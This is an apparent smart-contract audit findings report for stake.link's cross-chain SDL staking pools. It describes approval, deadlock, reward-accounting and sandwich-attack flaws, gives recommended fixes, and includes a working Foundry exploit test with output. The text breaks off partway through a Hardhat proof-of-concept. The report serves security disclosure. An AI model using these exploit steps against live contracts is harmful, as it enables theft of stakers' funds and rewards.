# stake.link - Findings Report

# Table of contents

- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
  - ### [H-01. Not Deleting Previous Approves in Cross-chain `reSDL` Transfer Lead to Steal of Funds](#H-01)
  - ### [H-02. One Failed Cross-Chain Transaction , Break Yhe Multi-Chain Functionality](#H-02)
  - ### [H-03. Rewards Distribution Susceptible to Sandwich Attack](#H-03)
  - ### [H-04. Not Update Rewards in `handleIncomingUpdate` Function of `SDLPoolPrimary` Leads to Incorrect Reward Calculations](#H-04)
- ## Medium Risk Findings
  - ### [M-01. A Specific Order of Queued Actions in `SecondaryPool` can Lead to Lost Ownership and Locked Funds](#M-01)

# <a id='contest-summary'></a>Contest Summary

### Sponsor: stake.link

### Dates: Dec 22nd, 2023 - Jan 12th, 2024

[See more contest details here](https://www.codehawks.com/contests/clqf7mgla0001yeyfah59c674)

# <a id='results-summary'></a>Results Summary

### Number of findings:

- High: 4
- Medium: 1
- Low: 0

# High Risk Findings

## <a id='H-01'></a>H-01. Not Deleting Previous Approves in Cross-chain `reSDL` Transfer Lead to Steal of Funds

## Summary

The SDLPool's cross-chain transfer mechanism does not revoke existing approvals of the `reSDL` NFT when transferred between chains. This oversight allows an original approver to exert control over an `reSDL`, even after it has been sold and its value potentially increased by new owners on other chains.

## Vulnerability Details

- The [SDLPool](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolPrimary.sol) allows users to stake `SDL` tokens and receive `reSDL` NFTs, which represent their staked positions. Each `reSDL` NFT is associated with a unique `lockId` that contains details such as the staked amount, boost amount, and duration...

- While `reSDL` positions can be transferred cross-chain or within the same chain, a security gap exists in the cross-chain transfer mechanism. Specifically, when an `reSDL` is transferred from one chain to another, the previous approvals for the `lockId` on the source chain are not revoked as we can see in [handleOutgoingRESDL](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolPrimary.sol#L172) function (in sdlPools cross all chains, secondaries and primary):

```js
 function handleOutgoingRESDL(address _sender, uint256 _lockId, address _sdlReceiver)
        external
        onlyCCIPController
        onlyLockOwner(_lockId, _sender)
        updateRewards(_sender)
        updateRewards(ccipController)
        returns (Lock memory)
     {
        Lock memory lock = locks[_lockId];

        delete locks[_lockId].amount;
        delete lockOwners[_lockId];
        balances[_sender] -= 1;

        uint256 totalAmount = lock.amount + lock.boostAmount;
        effectiveBalances[_sender] -= totalAmount;
        effectiveBalances[ccipController] += totalAmount;
        // sending the token to the sdlPoolCcipController .
        sdlToken.safeTransfer(_sdlReceiver, lock.amount);

        emit OutgoingRESDL(_sender, _lockId);

        return lock;
    }

```

This oversight can be exploited by malicious actors.

### poc example :

- consider the following example :
- Bob stakes `SDL` tokens on the primary chain and receives an `reSDL` with `lockId = 1`.
- in the primary chain he approves a secondary address he controls, `bobSecondAddress`, for this `reSDL` .

```js
    function approve(address _to, uint256 _lockId) external {
        address owner = ownerOf(_lockId);
        if (_to == owner) revert ApprovalToCurrentOwner();
        if (msg.sender != owner && !isApprovedForAll(owner, msg.sender)) revert SenderNotAuthorized();
        tokenApprovals[_lockId] = _to;
        emit Approval(owner, _to, _lockId);
    }
```

- Bob then transfers this `reSDL` to a [secondaryPool](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolSecondary.sol) in other chain through [RESDLTokenBridge](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/ccip/RESDLTokenBridge.sol#L84).
- bob will make a deal with Alice in the secondary chain, so alice will buys this `reSDL` from Bob on the secondary chain (notice that alice may increase its value by staking additional `SDL` tokens)
- Now,at any point, if the `reSDL` with `lockId = 1` is transferred back to the primary chain—whether by Alice or a subsequent owner,Bob can immediately use `bobSecondAddress` to execute `safeTransferFrom` on the primary chain for this `lockId`.

```js
  function safeTransferFrom(
        address _from,
        address _to,
        uint256 _lockId,
        bytes memory _data
     ) public {
        if (!_isApprovedOrOwner(msg.sender, _lockId)) revert SenderNotAuthorized();//@audit this will not revert
        _transfer(_from, _to, _lockId);
        if (!_checkOnERC721Received(_from, _to, _lockId, _data)) revert TransferToNonERC721Implementer();
    }
```

- This allows Bob to reclaim the `reSDL`, exploiting the fact that his approval on the primary chain was never revoked, even after multiple ownership changes on the secondary chain.
- The risk is that Bob can unexpectedly seize the `reSDL` upon its return to the primary chain, regardless of any value added by Alice or others to this position, compromising the integrity of the cross-chain transfer system.

## Impact

- This vulnerability allows original approvers to reclaim `reSDL` tokens after cross-chain transfers, which can lead to asset loss for current holders.

## Tools Used

manual review

## Recommendations

- Revoke reSDL NFT approvals on cross-chain transfers to prevent unauthorized control by previous approvers.
- in [SDLPoolPrimary](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolPrimary.sol#L172) and [SDLPoolSecondary](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolSecondary.sol#L259) :

```Diff
   function handleOutgoingRESDL(address _sender, uint256 _lockId, address _sdlReceiver)
        external
        onlyCCIPController
        onlyLockOwner(_lockId, _sender)
        updateRewards(_sender)
        updateRewards(ccipController)
        returns (Lock memory)
     {
        Lock memory lock = locks[_lockId];

        delete locks[_lockId].amount;
        delete lockOwners[_lockId];
        balances[_sender] -= 1;

        uint256 totalAmount = lock.amount + lock.boostAmount;
        effectiveBalances[_sender] -= totalAmount;
        effectiveBalances[ccipController] += totalAmount;
        // sending the token to the sdlPoolCcipController .
        sdlToken.safeTransfer(_sdlReceiver, lock.amount);
++      delete tokenApprovals[_lockId]
        emit OutgoingRESDL(_sender, _lockId);

        return lock;
    }

```

## <a id='H-02'></a>H-02. One Failed Cross-Chain Transaction , Break Yhe Multi-Chain Functionality

### Relevant GitHub Links

https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/ccip/SDLPoolCCIPControllerSecondary.sol#L66

https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolSecondary.sol#L313

https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/ccip/SDLPoolCCIPControllerSecondary.sol

## Summary

- the cross-chain update mechanism of the [SDLPoolSecondary](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolSecondary.sol) can lead to a deadlock situation, where the `updateInProgress` flag remains indefinitely set to `1`. This occurs when the _update_ transaction on the primary chain or the callback transaction to the secondary chain fails. As a result, the system is unable to process new updates, effectively freezing the staking system in the secondary pool and leaving user actions in a state of suspension without a recovery mechanism in place.

## Vulnerability Details

- When actions are queued on the secondary chain, the function [performUpkeep](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/ccip/SDLPoolCCIPControllerSecondary.sol#L66) in the [SDLPoolCCIPControllerSecondary](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/ccip/SDLPoolCCIPControllerSecondary.sol) is tasked with sending these updates to the primary chain. This involves invoking the [handleOutgoingUpdate](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolSecondary.sol#L313) function within the [SDLPoolSecondary](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolSecondary.sol), and then send the crosschain updates to the primary chain :

```js
  function performUpkeep(bytes calldata) external {
        if (!shouldUpdate) revert UpdateConditionsNotMet();
        shouldUpdate = false;
        _initiateUpdate(primaryChainSelector, primaryChainDestination, extraArgs);
    }
     function _initiateUpdate(uint64 _destinationChainSelector, address _destination, bytes memory _extraArgs)
        internal
    {
   >>   (uint256 numNewRESDLTokens, int256 totalRESDLSupplyChange) = ISDLPoolSecondary(sdlPool).handleOutgoingUpdate();

        Client.EVM2AnyMessage memory evm2AnyMessage =
            _buildCCIPMessage(_destination, numNewRESDLTokens, totalRESDLSupplyChange, _extraArgs);

        IRouterClient router = IRouterClient(this.getRouter());
        uint256 fees = router.getFee(_destinationChainSelector, evm2AnyMessage);

        if (fees > maxLINKFee) revert FeeExceedsLimit(fees);
    >>  bytes32 messageId = router.ccipSend(_destinationChainSelector, evm2AnyMessage);

        emit MessageSent(messageId, _destinationChainSelector, fees);
    }
```

- in the [handleOutgoingUpdate](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolSecondary.sol#L313) function it checks if an update is already in progress by examining the `updateInProgress` flag. If set to `1`, the function will revert, preventing any further updates.If no update is in progress, [`handleOutgoingUpdate`](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolSecondary.sol#L313) sets `updateInProgress` to `1` and prepares to send the number of new queued locks (`numNewQueuedLocks`) and the change in the reSDL supply (`reSDLSupplyChange`) to the primary chain:

```js
 function handleOutgoingUpdate() external onlyCCIPController returns (uint256, int256) {
 >>       if (updateInProgress == 1) revert UpdateInProgress();
        uint256 numNewQueuedLocks = queuedNewLocks[updateBatchIndex].length;
        int256 reSDLSupplyChange = queuedRESDLSupplyChange;
        queuedRESDLSupplyChange = 0;
        updateBatchIndex++;
 >>     updateInProgress = 1;
        updateNeeded = 0;
        queuedNewLocks.push();

        emit OutgoingUpdate(updateBatchIndex - 1, numNewQueuedLocks, reSDLSupplyChange);

        return (numNewQueuedLocks, reSDLSupplyChange);
    }
```

- in the primary chain the [SDLPoolCCIPControllerPrimary](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/ccip/SDLPoolCCIPControllerPrimary.sol) receives the message. and verifies that the **sender** is the [SDLPoolCCIPControllerSecondary](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/ccip/SDLPoolCCIPControllerSecondary.sol) in the src chain, then calls [`handleIncomingUpdates`](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolPrimary.sol#L231) in the [SDLPoolPrimary](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolPrimary.sol#L231), which provides the `mintStartIndex`. This index is then communicated back to the secondary chain by the [SDLPoolCCIPControllerPrimary](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/ccip/SDLPoolCCIPControllerPrimary.sol) in another crosschain transaction.

```js
 /// SDLPoolCCIPControllerPrimary
 function ccipReceive(Client.Any2EVMMessage calldata _message) external override onlyRouter {

    >>   _verifyCCIPSender(_message);

        if (_message.destTokenAmounts.length == 1 && _message.destTokenAmounts[0].token == address(sdlToken)) {
            IRESDLTokenBridge(reSDLTokenBridge).ccipReceive(_message);
        } else {
    >>      _ccipReceive(_message);//@auditor : this function will be excuted in our case
        }
    }

    function _ccipReceive(Client.Any2EVMMessage memory _message) internal override {
        uint64 sourceChainSelector = _message.sourceChainSelector;

        (uint256 numNewRESDLTokens, int256 totalRESDLSupplyChange) = abi.decode(_message.data, (uint256, int256));

        if (totalRESDLSupplyChange > 0) {
            reSDLSupplyByChain[sourceChainSelector] += uint256(totalRESDLSupplyChange);
        } else if (totalRESDLSupplyChange < 0) {
            reSDLSupplyByChain[sourceChainSelector] -= uint256(-1 * totalRESDLSupplyChange);
        }

  >>    uint256 mintStartIndex =ISDLPoolPrimary(sdlPool).handleIncomingUpdate(numNewRESDLTokens, totalRESDLSupplyChange);

  >>    _ccipSendUpdate(sourceChainSelector, mintStartIndex);// @auditor : callback to the secondary chain

        emit MessageReceived(_message.messageId, sourceChainSelector);
    }
```

- the issue occurs if the **transaction on the primary chain reverts** or the **callback transaction that sends `mintStartIndex` from primary to secondary chain reverts** for any reason (which high likely, for example miss passing the **\_extraArgs** , not enough LINK tokens in `SDLPoolCCIPControllerPrimary` to pay fee for the callback ...ect). This event would severely disrupt this secondary pool functionality. In the event of a transaction revert, there is no _recovery mechanism_, and sending updates to the primary chain for new actions on the secondary chain becomes impossible because the [ccipControllerSecondary](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/ccip/SDLPoolCCIPControllerSecondary.sol) is the sole contract authorized to send such transaction, but it can only do so when the `updateInProgress` flag is zero,and the `updateInProgress` flag only get reset to `0`, when the udpated sended to the primary has returned the `mintStartIndex` to the function [handleIncomingUpdate](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolSecondary.sol#L336) in the `secondaryPool`, which won't happend cause the transaction failed :

```js
     function handleIncomingUpdate(uint256 _mintStartIndex) external onlyCCIPController {
        if (updateInProgress == 0) revert NoUpdateInProgress();

        if (_mintStartIndex != 0) {
            // the _mintStartIndex will be minted the first then increament the by one for the next id ..
            uint256 newLastLockId = _mintStartIndex + queuedNewLocks[updateBatchIndex - 1].length - 1;
            if (newLastLockId > lastLockId) lastLockId = newLastLockId;
        }

        currentMintLockIdByBatch.push(_mintStartIndex);
    >>  updateInProgress = 0;
        emit IncomingUpdate(updateBatchIndex - 1, _mintStartIndex);
    }
```

- This results in a deadlock situation where the system is indefinitely stalled, unable to process any new updates. The `updateInProgress` flag remains perpetually set to `1` signaling that an update is still being processed and thus blocking the initiation of any subsequent updates.

## Impact

- This vulnerability stops all updates between the secondary and primary pools, leaving users' staked funds inaccessible and disrupting the staking service.

## Tools Used

manual review

## Recommendations

Introduce a fallback mechanism that resets the updateInProgress flag in the event of a transaction failure. This could involve a timeout function or a manual override by an authorized administrator to ensure that updates can resume and the system can recover from stalled states.

## <a id='H-03'></a>H-03. Rewards Distribution Susceptible to Sandwich Attack

### Relevant GitHub Links

https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/base/RewardsPoolController.sol#L112

https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/base/RewardsPoolController.sol#L112

https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/base/RewardsPoolController.sol#L142

## Summary

the [SDLPool](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolPrimary.sol) contract allows a malicious actor to perform a sandwich attack to gain immediate rewards by exploiting the timing of reward distribution transactions.

## Vulnerability Details

The [SDLPool](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolPrimary.sol) contract's reward distribution mechanism it's susceptible to exploitation due to the way of reward calculations. There is a global `rewardPerToken` variable used to calculate the rewards for stakers and is updated (only increases) whenever new rewards are added to the pool via the [`distributeToken`](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/base/RewardsPoolController.sol#L112) function. However, this mechanism allow A malicious actor to simply buy `sdl` tokens and stake right before the [distributeToken](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/base/RewardsPoolController.sol#L112) function is called to immediately accrue a portion of rewards that were meant to be attributed to other stakers. The malicious actor can then immediately claim these rewards, unstake and sell thier `sdl` therefore stealing rewards from other stakers.

### example :

- assume we have `10 sdl` tokens staked before for alice .. and the rewardPerToken is `1 r`
- bob observes a pending transaction that will trigger a reward distribution with `100 r` .
- bob sends 100 `sdl` token triggering [`onTokenTransfer`](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolPrimary.sol#L61) to deposit and front-running the pending reward distribution transaction.
  - in this case bob **userRewardPerTokenPaid** will be `1` , and he got `0 r` in rewards.
- Once the [`distributeToken`](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/base/RewardsPoolController.sol#L112) transaction is confirmed, `rewardPerToken` is updated to be : rewardPerToken += `100 / 110 ≈ 1.9 r`.
- bob immediately calls [`withdrawRewards`](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/base/RewardsPoolController.sol#L142) to claim the rewards based on the updated `rewardPerToken` which will be :
  - _staked _ (rewardPerToken - userRewardPerTokenPaid[bob])_ </br>
    `100 _ (1.9 - 1) =`  **`90 r`\*\*
- bob then calls [`withdraw`](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolPrimary.sol#L134) to remove their SDL tokens from the `SdlPool`.

This sequence of actions allowed bob to receive 90% of the rewards immediately, disadvantaging other stakers.

## POC :

- a foundry test with a min setup shows how bob sandwich the distribute reward tx to gain more then `90%` of rewards.

```js
 //SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import "../../contracts/core/sdlPool/SDLPoolPrimary.sol";
import "../../contracts/core/tokens/StakingAllowance.sol";
import "../../contracts/core/sdlPool/LinearBoostController.sol";
import "../../contracts/core/RewardsPool.sol";
import "../../contracts/core/tokens/base/ERC677.sol";
contract proxy {
    address immutable private imple;
    receive() external payable{}
    constructor (address _implem) {
        imple = _implem;
    }

    function implementation() public view returns(address) {
        return imple;
    }
    fallback() external payable {
        if (msg.data.length > 0){
            address addr = implementation();
        (bool ok ,) = addr.delegatecall(msg.data);
        if(!ok) revert("failed");
        assembly {
            returndatacopy(0,0,returndatasize())
            return(0,returndatasize())
        }
        }
    }
}
contract sandwichPoc is Test {
    SDLPoolPrimary p_pool;
    proxy primaryPool;
    StakingAllowance sdl;
    LinearBoostController boostController;
    RewardsPool r_pool;
    ERC677 r_token = new ERC677("rewared token", "RT",100000 ether);
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    function setUp() public {

        p_pool = new SDLPoolPrimary();// deploy the primary pool implementation
        primaryPool = new proxy(address(p_pool)); // min proxy for primary pool
        p_pool = SDLPoolPrimary(address(primaryPool));
        // deploy the sdl token :
        sdl = new StakingAllowance("sdl token","SDL");
        boostController = new LinearBoostController(4 * 365 days, 4); // deploy the boostController
        r_pool = new RewardsPool(address(p_pool),address(r_token)); // deploy the reward pool
        p_pool.initialize("testing","tt",address(sdl), address(boostController)); // initialize the primary pool
        p_pool.addToken(address(r_token),address(r_pool)); // add the token
        p_pool.setCCIPController(address(this));// to avoid ccip acess controle errors
        sdl.mint(bob, 120 ether);// mint sdl tokens to bob
        sdl.mint(alice,10 ether);// mint sdl tokens to alice
        vm.prank(alice);// alice is a normal staker, that deposit 10 tokens with a stake period .
        sdl.transferAndCall(address(p_pool),10 ether,abi.encode(0,10 days));
    }

    function test_Poc() public {
        // assume that some rewareds are sent to the pool to be distributed :
        // bob will frontrun this to deposit sdl tokens :
        frontrun();
        r_token.transferAndCall(address(p_pool),10 ether,""); // distribute rewared ..
        backrun();
        // check balances after :
        uint bob_reward = r_token.balanceOf(bob);
        uint bob_sdlbalance = sdl.balanceOf(bob);
        console.log("bob rewared after sandwich attack     : ", bob_reward);
        console.log("bob sdl balance after sandwich attack : ", bob_sdlbalance);
        // calculate the percentage of the rewards bob took :
        uint perc = bob_reward * 100 / 10 ether;
        console.log("bob was able to steal " ,perc,"% of the rewared from alice " );
    }
    function frontrun() internal {
        // stake sdl token:
        vm.prank(bob);
        sdl.transferAndCall(address(p_pool),120 ether,abi.encode(0,0));
    }

    function backrun() internal {
        // withdraw rewared :
        vm.startPrank(bob);
        p_pool.withdrawRewards(p_pool.supportedTokens());
        // withdraw sdl :
        uint lockId = p_pool.lastLockId();
        p_pool.withdraw(lockId,120 ether);
        vm.stopPrank();
    }



}
```

- console after running test :

```sh
 Running 1 test for test/foundry_t/setUp.t.sol:sandwichPoc
[PASS] test_Poc() (gas: 316360)
Logs:
  bob rewared after sandwich attack     :  9211356466876971600
  bob sdl balance after sandwich attack :  120000000000000000000
  bob was able to steal  92 % of the rewared from alice
```

## Impact

- This attack allows an actor to unfairly claim a portion of the rewards,that were meant to be attributed to other stakers. whitout actually staking `sdl` tokens

## Tools Used

vs code
foundry
manual review

## recommendations :

- There are many approaches that can be taken in this case, and it depends on the team how to mitigate that. One example is adding a `warmup period` before the [`distributeToken`](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/base/RewardsPoolController.sol#L112) function is called, where those who stake during this period will not accrue rewards.

## <a id='H-04'></a>H-04. Not Update Rewards in `handleIncomingUpdate` Function of `SDLPoolPrimary` Leads to Incorrect Reward Calculations

### Relevant GitHub Links

https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolPrimary.sol#L231

## Summary

Failing to update rewards before executing the [`handleIncomingUpdate`](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolPrimary.sol#L231) function in [`SDLPoolPrimary`](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolPrimary.sol), while adjusting the `effectiveBalance` of the [`ccipController`](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/ccip/SDLPoolCCIPControllerPrimary.sol), results in miscalculated rewards. This oversight can obstruct the distribution of rewards for the secondary chain.

## Vulnerability Details

- Actions taken in the secondary pool are queued and then communicated to the primary pool. The primary pool must acknowledge these changes before they are executed. The message sent to the primary pool includes the number of new queued locks to be minted (`numNewQueuedLocks`) and the change in the reSDL supply (`reSDLSupplyChange`).

- Upon receiving the message, the [`SDLPoolCCIPControllerPrimary` ](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/ccip/SDLPoolCCIPControllerPrimary.sol) contract updates the `reSDLSupplyByChain` and forwards the message to [`SDLPoolPrimary`](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolPrimary.sol#L231). The [`SDLPoolPrimary`](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolPrimary.sol#L231) contract then processes the message, returning the `mintStartIndex` for the secondary chain to use when minting new locks. It also updates the [`effectiveBalances`](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolPrimary.sol#L243) for the `ccipController` and the `totalEffectiveBalance`.

```js
  function _ccipReceive(Client.Any2EVMMessage memory _message) internal override {
        uint64 sourceChainSelector = _message.sourceChainSelector;

        (uint256 numNewRESDLTokens, int256 totalRESDLSupplyChange) = abi.decode(_message.data, (uint256, int256));

        if (totalRESDLSupplyChange > 0) {
  >>        reSDLSupplyByChain[sourceChainSelector] += uint256(totalRESDLSupplyChange);
        } else if (totalRESDLSupplyChange < 0) {
  >>        reSDLSupplyByChain[sourceChainSelector] -= uint256(-1 * totalRESDLSupplyChange);
        }
  >>    uint256 mintStartIndex =ISDLPoolPrimary(sdlPool).handleIncomingUpdate(numNewRESDLTokens, totalRESDLSupplyChange);
        _ccipSendUpdate(sourceChainSelector, mintStartIndex);

        emit MessageReceived(_message.messageId, sourceChainSelector);
    }
```

- The issue arises because the [`handleIncomingUpdate`](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolPrimary.sol#L231) function does not update the rewards before altering these values. Since these values directly affect reward accounting, failing to update them leads to incorrect calculations. This could result in a scenario where the total rewards accrued by all stakers exceed the available balance in the `rewardsPool`.

```js
  function handleIncomingUpdate(uint256 _numNewRESDLTokens, int256 _totalRESDLSupplyChange)
        external
        onlyCCIPController
        returns (uint256)
    {
       // some code ...

        if (_totalRESDLSupplyChange > 0) {
>>            effectiveBalances[ccipController] += uint256(_totalRESDLSupplyChange);
>>           totalEffectiveBalance += uint256(_totalRESDLSupplyChange);
        } else if (_totalRESDLSupplyChange < 0) {
>>           effectiveBalances[ccipController] -= uint256(-1 * _totalRESDLSupplyChange);
>>            totalEffectiveBalance -= uint256(-1 * _totalRESDLSupplyChange);
        }
  // more code ....
    }
```

- For example, consider Alice has staked `500 sdl` tokens, and there is an outgoing `1000 reSdl`. The state would be as follows:

- `effectiveBalance[alice]` = **500**
- `effectiveBalance[ccipController]` = **1000**
- `totalEffectiveBalance` = **1500**

- Now, assume `1500 reward` tokens are distributed this will update the `rewardPerToken = 1` (rewards/totalStaked), and Alice will withdraw her rewards. The amount of rewards Alice receives is calculated using the [`withdrawableRewards`](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/RewardsPool.sol#L38) function, which relies on her `effectiveBalance` (controller.staked()). With a `rewardPerToken` of `1` and Alice's `userRewardPerTokenPaid` at `0`, Alice would receive `500 rewards`.

```js
  function withdrawableRewards(address _account) public view virtual returns (uint256) {
       return (controller.staked(_account) *(rewardPerToken - userRewardPerTokenPaid[_account]) ) / 1e18
           + userRewards[_account];
   }
```

- now, someone stakes another `1000 sdl` on the secondary chain, an incoming update with a supply change of `1000` is received on the primary chain. This update changes the `effectiveBalance[ccipController]` to `2000` without a prior reward update which will keep the `userRewardPerTokenPaid` for ccipController 0.

  ```js
     function handleIncomingUpdate(uint256 _numNewRESDLTokens, int256 _totalRESDLSupplyChange)external onlyCCIPController returns (uint256){
        uint256 mintStartIndex;
        if (_numNewRESDLTokens != 0) {
            mintStartIndex = lastLockId + 1;
            lastLockId += _numNewRESDLTokens;
        }

        if (_totalRESDLSupplyChange > 0) {
   >>        effectiveBalances[ccipController] += uint256(_totalRESDLSupplyChange);
            totalEffectiveBalance += uint256(_totalRESDLSupplyChange);
        } else if (_totalRESDLSupplyChange < 0) {
            effectiveBalances[ccipController] -= uint256(-1 * _totalRESDLSupplyChange);
            totalEffectiveBalance -= uint256(-1 * _totalRESDLSupplyChange);
        }

        emit IncomingUpdate(_numNewRESDLTokens, _totalRESDLSupplyChange, mintStartIndex);

        return mintStartIndex;
    }
  ```

- Consequently, when the [`RewardsInitiator`](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/RewardsInitiator.sol#L41) contract calls the [`distributeRewards`](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/ccip/SDLPoolCCIPControllerPrimary.sol#L56) function in [`SDLPoolCCIPControllerPrimary`](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/ccip/SDLPoolCCIPControllerPrimary.sol), attempting to `withdrawRewards` from the `rewardPool` the call will perpetually fail. The rewards for the [`ccipController`](https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/ccip/SDLPoolCCIPControllerPrimary.sol) would be calculated as `2000 * (1 - 0) = 2000 rewards`, while the actual balance of the `rewardsPool` is only `1000 rewards`.

  ```js
     function distributeRewards() external onlyRewardsInitiator {
        uint256 totalRESDL = ISDLPoolPrimary(sdlPool).effectiveBalanceOf(address(this));
        address[] memory tokens = ISDLPoolPrimary(sdlPool).supportedTokens();
        uint256 numDestinations = whitelistedChains.length;

    >> ISDLPoolPrimary(sdlPool).withdrawRewards(tokens);
        // ... more code ..
    }
  ```

- notice that the increase of `1000` will never be solved .

## POC

- here a poc that shows , that not updating reward in incomingUpdates , will cause the distributeReward function to revert , cause of insufficient balance in the reward pool , i used the repo setup :

```js
 import { ethers } from 'hardhat'
import {  expect } from 'chai'
import { toEther, deploy, deployUpgradeable, getAccounts, fromEther } from '../../utils/helpers'
import {
  ERC677,
  CCIPOnRampMock,
  CCIPOffRampMock,
  CCIPTokenPoolMock,
  SDLPoolPrimary,
  SDLPoolCCIPControllerPrimary,
  Router,
} from '../../../typechain-types'
import {  Signer } from 'ethers'

describe('SDLPoolCCIPControllerPrimary', () => {
  let linkToken: ERC677
  let sdlToken: ERC677
  let token1: ERC677
  let token2: ERC677
  let controller: SDLPoolCCIPControllerPrimary
  let sdlPool: SDLPoolPrimary
  let onRamp: CCIPOnRampMock
  let offRamp: CCIPOffRampMock
  let tokenPool: CCIPTokenPoolMock
  let tokenPool2: CCIPTokenPoolMock
  let router: any
  let accounts: string[]
  let signers: Signer[]

  before(async () => {
    ;({ signers, accounts } = await getAccounts())
  })

  beforeEach(async () => {
    linkToken = (await deploy('ERC677', ['Chainlink', 'LINK', 1000000000])) as ERC677 // deploy the link token ..
    sdlToken = (await deploy('ERC677', ['SDL', 'SDL', 1000000000])) as ERC677 // deploy the sdl token
    token1 = (await deploy('ERC677', ['2', '2', 1000000000])) as ERC677
    token2 = (await deploy('ERC677', ['2', '2', 1000000000])) as ERC677

    const armProxy = await deploy('CCIPArmProxyMock')
    // router takes the wrapped native , and the armProxy address
    router = (await deploy('Router', [accounts[0], armProxy.address])) as Router
    tokenPool = (await deploy('CCIPTokenPoolMock', [token1.address])) as CCIPTokenPoolMock // token1 pool for cross chain deposit and withdraw
    tokenPool2 = (await deploy('CCIPTokenPoolMock', [token2.address])) as CCIPTokenPoolMock // token2 pool for crosschain deposit and withdraw .
    onRamp = (await deploy('CCIPOnRampMock', [ // deploy the onRamp
      [token1.address, token2.address],
      [tokenPool.address, tokenPool2.address],
      linkToken.address,
    ])) as CCIPOnRampMock
    offRamp = (await deploy('CCIPOffRampMock', [
      router.address,
      [token1.address, token2.address],
      [tokenPool.address, tokenPool2.address],
    ])) as CCIPOffRampMock

    await router.applyRampUpdates([[77, onRamp.address]], [], [[77, offRamp.address]])

    let boostController = await deploy('LinearBoostController', [4 * 365 * 86400, 4])
    sdlPool = (await deployUpgradeable('SDLPoolPrimary', [
      'reSDL',
      'reSDL',
      sdlToken.address,
      boostController.address,
    ])) as SDLPoolPrimary
    controller = (await deploy('SDLPoolCCIPControllerPrimary', [
      router.address,
      linkToken.address,
      sdlToken.address,
      sdlPool.address,
      toEther(10),
    ])) as SDLPoolCCIPControllerPrimary

    await linkToken.transfer(controller.address, toEther(100))
    await sdlToken.transfer(accounts[1], toEther(200))
    await sdlPool.setCCIPController(controller.address)
    await controller.setRESDLTokenBridge(accounts[5])
    await controller.setRewardsInitiator(accounts[0])
    await controller.addWhitelistedChain(77, accounts[4], '0x11', '0x22')
  })



  it('poc that when there is encoming updates the rewared is wrong calculated',async () => {
      let wToken = await deploy('WrappedSDTokenMock', [token1.address])
      let rewardsPool = await deploy('RewardsPoolWSD', [
        sdlPool.address,
        token1.address,
        wToken.address,
      ])
      let wtokenPool = (await deploy('CCIPTokenPoolMock', [wToken.address])) as CCIPTokenPoolMock
      await sdlPool.addToken(token1.address, rewardsPool.address)
      await controller.approveRewardTokens([wToken.address]) // approve the wrapped token to wroter from the ccipPramiry
      await controller.setWrappedRewardToken(token1.address, wToken.address)
